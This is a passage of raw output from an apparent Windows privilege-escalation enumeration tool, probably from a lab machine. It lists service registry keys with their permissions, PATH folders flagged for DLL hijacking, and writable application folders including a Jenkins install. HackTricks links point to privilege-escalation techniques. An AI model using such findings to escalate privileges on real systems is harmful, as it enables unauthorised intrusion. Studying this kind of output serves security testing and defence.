    HKLM\system\currentcontrolset\services\mshidumdf (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\msisadrv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MSiSCSI (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\msiserver (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MsKeyboardFilter (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MSKSSRV (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MsLldp (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MSPCLOCK (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MSPQM (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MsQuic (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MsRPC (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MSSCNTRS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MsSecFlt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\mssmbios (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MSTEE (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MTConfig (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Mup (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\mvumis (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\napagent (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NativeWifiP (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NaturalAuthentication (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NcaSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NcbService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NcdAutoSetup (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ndfltr (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NDIS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NdisCap (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NdisImPlatform (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NdisTapi (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Ndisuio (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NdisVirtualBus (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NdisWan (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ndiswanlegacy (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NDKPing (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ndproxy (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Ndu (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NetAdapterCx (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NetBIOS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NetbiosSmb (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NetBT (Administrators [FullControl GenericAll])
    HKLM\system\currentcontrolset\services\Netlogon (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Netman (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\netprofm (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NetSetupSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NetTcpPortSharing (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\netvsc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NgcCtnrSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NgcSvc (Administrators [TakeOwnership FullControl])
    HKLM\system\currentcontrolset\services\NlaSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Npfs (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\npsvctrig (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\nsi (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\nsiproxy (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\NTDS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Ntfs (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Null (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\nvdimm (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\nvraid (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\nvstor (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\OneSyncSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\OneSyncSvc_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\p2pimsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\p2psvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Parport (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\partmgr (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PcaSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\pci (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\pciide (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\pcmcia (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\pcw (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\pdc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PEAUTH (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PeerDistSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\perceptionsimulation (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\percsas2i (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\percsas3i (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PerfDisk (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PerfHost (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PerfNet (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PerfOS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PerfProc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PhoneSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PimIndexMaintenanceSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PimIndexMaintenanceSvc_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PktMon (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\pla (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PlugPlay (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\pmem (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PNPMEM (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PNRPAutoReg (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PNRPsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PolicyAgent (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\portcfg (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PortProxy (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Power (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PptpMiniport (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PrintNotify (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PrintWorkflowUserSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PrintWorkflowUserSvc_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Processor (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ProfSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Psched (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\PushToInstall (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\pvscsi (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\QWAVE (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\QWAVEdrv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Ramdisk (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RasAcd (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RasAgileVpn (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RasAuto (Administrators [GenericAll FullControl])
    HKLM\system\currentcontrolset\services\Rasl2tp (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RasMan (Administrators [GenericAll FullControl])
    HKLM\system\currentcontrolset\services\RasPppoe (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RasSstp (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\rdbss (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RDMANDK (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\rdpbus (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RDPDR (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RDPNP (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RDPUDD (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RdpVideoMiniport (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\rdyboost (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ReFS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ReFSv1 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RemoteAccess (Administrators [GenericAll FullControl])
    HKLM\system\currentcontrolset\services\RemoteRegistry (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RetailDemo (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RFCOMM (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\rhproxy (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RmSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\RpcEptMapper (Administrators [TakeOwnership FullControl])
    HKLM\system\currentcontrolset\services\RpcLocator (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\rspndr (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\s3cap (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\sbp2port (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SCardSvr (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ScDeviceEnum (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\scfilter (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Schedule (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\scmbus (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SCPolicySvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\sdbus (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SDFRd (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SDRSVC (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\sdstor (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\seclogon (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SecurityHealthService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SEMgrSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SENS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Sense (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SensorDataService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SensorService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SensrSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SerCx (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SerCx2 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Serenum (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Serial (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\sermouse (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SessionEnv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\sfloppy (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SgrmAgent (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SgrmBroker (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SharedAccess (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SharedRealitySvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ShellHWDetection (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\shpamsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SiSRaid2 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SiSRaid4 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SmartSAMD (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\smbdirect (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\smphost (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SmsRouter (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SMSvcHost 4.0.0.0 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SNMPTRAP (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\spaceparser (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\spaceport (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SpatialGraphFilter (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SpbCx (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\spectrum (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Spooler (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\sppsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\srv2 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\srvnet (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SSDPSRV (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ssh-agent (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SstpSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\StateRepository (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\stexstor (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\stisvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\storahci (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\storflt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\stornvme (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\storqosflt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\StorSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\storufs (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\storvsc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\svsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\swenum (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\swprv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Synth3dVsc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SysMain (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\SystemEventsBroker (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\TabletInputService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\TapiSrv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Tcpip (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Tcpip6 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\TCPIP6TUNNEL (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\tcpipreg (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\TCPIPTUNNEL (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\tdx (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Telemetry (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\terminpt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\TermService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Themes (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\TieringEngineService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\TimeBrokerSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\TokenBroker (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\TPM (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\TroubleshootingSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\TSDDD (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\TsUsbFlt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\TsUsbGD (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\tsusbhub (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\tunnel (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\tzautoupdate (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UASPStor (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UcmCx0101 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UcmTcpciCx0101 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UcmUcsiAcpiClient (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UcmUcsiCx0101 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Ucx01000 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UdeCx (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\udfs (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UdkUserSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UdkUserSvc_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UEFI (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UevAgentDriver (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UevAgentService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Ufx01000 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UfxChipidea (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ufxsynopsys (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UGatherer (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UGTHRSVC (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\umbus (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UmPass (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UmRdpService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UnistoreSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UnistoreSvc_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\upnphost (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UrsChipidea (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UrsCx01000 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UrsSynopsys (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\usbaudio (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\usbaudio2 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\usbccgp (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\usbcir (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\usbehci (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\usbhub (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\USBHUB3 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\usbohci (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\usbprint (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\usbser (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\USBSTOR (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\usbuhci (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\USBXHCI (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UserDataSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UserDataSvc_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UserManager (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\UsoSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\VacSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\VaultSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vdrvroot (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vds (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\VerifierExt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\VGAuthService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vhdmp (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vhf (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Vid (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\VirtualRender (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vm3dmp (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vm3dmp-debug (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vm3dmp-stats (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vm3dmp_loader (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmbus (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\VMBusHID (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmci (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmgid (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmicguestinterface (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmicheartbeat (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmickvpexchange (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmicrdv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmicshutdown (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmictimesync (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmicvmsession (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmicvss (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\VMMemCtl (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmmouse (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\VMTools (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmusbmouse (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmvss (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\VMwareCAFCommAmqpListener (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\VMwareCAFManagementAgentHost (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmwefifw (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vmxnet3ndis6 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\volmgr (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\volmgrx (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\volsnap (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\volume (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vpci (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vsmraid (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vsock (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\VSS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\VSTXRAID (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vwifibus (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\vwififlt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\W32Time (Administrators [FullControl GenericAll])
    HKLM\system\currentcontrolset\services\WaaSMedicSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WacomPen (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WalletService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\wanarp (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\wanarpv6 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WarpJITSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\wbengine (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WbioSrvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\wcifs (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Wcmsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\wcncsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\wcnfs (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WdBoot (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Wdf01000 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WdFilter (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\wdiwifi (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WdmCompanionFilter (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WdNisDrv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WdNisSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WebClient (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Wecsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WEPHOSTSVC (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\wercplsupport (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WerSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WFDSConMgrSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WFPLWFS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WiaRpc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WIMMount (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WinDefend (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Windows Workflow Foundation 4.0.0.0 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WindowsTrustedRT (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WindowsTrustedRTProxy (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WinHttpAutoProxySvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WinMad (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Winmgmt (Administrators [GenericAll FullControl])
    HKLM\system\currentcontrolset\services\WinNat (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WinRM (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Winsock (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WinSock2 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WINUSB (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WinVerbs (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WiseBootAssistant (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\wisvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WlanSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\wlidsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\wlpasvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WManSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WmiAcpi (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WmiApRpl (Administrators [GenericAll FullControl])
    HKLM\system\currentcontrolset\services\wmiApSrv (Administrators [GenericAll FullControl])
    HKLM\system\currentcontrolset\services\WMPNetworkSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Wof (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\workerdd (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\workfolderssvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WpcMonSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WPDBusEnum (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WpdUpFltr (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WpnService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WpnUserService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WpnUserService_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ws2ifsl (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\wscsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WSearch (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WSearchIdxPi (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\wuauserv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WudfPf (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WUDFRd (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\WwanSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\XblAuthManager (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\XblGameSave (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\xboxgip (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\XboxGipSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\XboxNetApiSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\xinputhid (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\xmlprov (Administrators [FullControl])

����������͹ Checking write permissions in PATH folders (DLL Hijacking)
� Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking
    (DLL Hijacking) C:\Program Files (x86)\Common Files\Oracle\Java\javapath: Administrators [AllAccess]
    (DLL Hijacking) C:\Windows\system32: Administrators [WriteData/CreateFiles]
    (DLL Hijacking) C:\Windows: Administrators [WriteData/CreateFiles]
    (DLL Hijacking) C:\Windows\System32\Wbem: Administrators [WriteData/CreateFiles]
    (DLL Hijacking) C:\Windows\System32\WindowsPowerShell\v1.0\: Administrators [WriteData/CreateFiles]
    (DLL Hijacking) C:\Windows\System32\OpenSSH\: Administrators [WriteData/CreateFiles]


�����������������������������������͹ Applications Information �������������������������������������

����������͹ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

����������͹ Installed Applications --Via Program Files/Uninstall registry--
� Check if you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
    C:\Program Files\Common Files(Administrators [WriteData/CreateFiles])
    C:\Program Files\desktop.ini(Administrators [AllAccess])
    C:\Program Files\Internet Explorer(Administrators [WriteData/CreateFiles])
    C:\Program Files\Java(Administrators [AllAccess])
    C:\Program Files\Jenkins(Administrators [AllAccess], butler [AllAccess])
    C:\Program Files\ModifiableWindowsApps
    C:\Program Files\Uninstall Information(Administrators [AllAccess])
    C:\Program Files\VMware(Administrators [AllAccess])
    C:\Program Files\Windows Defender(Administrators [WriteData/CreateFiles])
    C:\Program Files\Windows Defender Advanced Threat Protection(Administrators [WriteData/CreateFiles])
    C:\Program Files\Windows Mail(Administrators [WriteData/CreateFiles])
